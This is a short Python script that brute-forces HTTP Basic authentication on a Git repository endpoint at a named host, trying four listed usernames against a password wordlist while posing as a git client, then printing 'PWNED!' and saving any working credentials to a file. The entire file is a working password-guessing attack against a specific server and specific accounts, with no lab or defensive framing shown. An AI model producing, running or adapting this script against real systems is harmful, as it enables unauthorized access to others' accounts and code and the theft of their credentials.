import requests
import sys
import base64

TARGET = "http://g.orehus.club/orehus/infra.git/info/refs?service=git-upload-pack"
USERS = ["orehus", "d3v1l", "doesnm", "r00ter33"]

def brute():
    with open("phantom/wordlist.txt", "r") as f:
        passwords = [line.strip() for line in f]

    print(f"[*] Attacking {TARGET}")
    
    for user in USERS:
        for pwd in passwords:
            creds = f"{user}:{pwd}"
            b64_creds = base64.b64encode(creds.encode()).decode()
            headers = {
                "Authorization": f"Basic {b64_creds}",
                "User-Agent": "git/2.43.0"
            }
            
            try:
                r = requests.get(TARGET, headers=headers, timeout=5)
                if r.status_code == 200:
                    print(f"\n\033[92m[+] PWNED! {user}:{pwd}\033[0m")
                    with open("phantom/pwned_creds.txt", "w") as out:
                        out.write(f"{user}:{pwd}")
                    return
                elif r.status_code == 401:
                    print(f"\r[-] Failed: {user}:{pwd}", end="")
                else:
                    print(f"\r[!] Error {r.status_code}: {user}:{pwd}", end="")
            except Exception as e:
                print(f"\n[!] Ex: {e}")

    print("[*] Done.")

if __name__ == "__main__":
    brute()
